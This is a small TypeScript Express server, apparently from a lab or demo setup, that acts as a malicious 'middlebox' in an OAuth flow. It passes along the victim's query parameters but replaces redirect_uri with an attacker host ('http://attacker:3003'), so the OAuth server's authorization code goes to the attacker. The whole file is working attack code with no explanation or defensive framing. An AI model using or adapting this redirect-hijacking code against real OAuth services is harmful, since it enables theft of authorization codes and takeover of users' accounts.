import express from "express";

const app = express();

app.get("/", (req, res) => {
    const params = new URLSearchParams({
        ...(req.query as Record<string, string>),
        redirect_uri: "http://attacker:3003",
    });

    res.redirect(`http://oauthserver:3000/code?${params}`);
});

app.listen(8080, () => console.log("Middlebox running on :8080"));
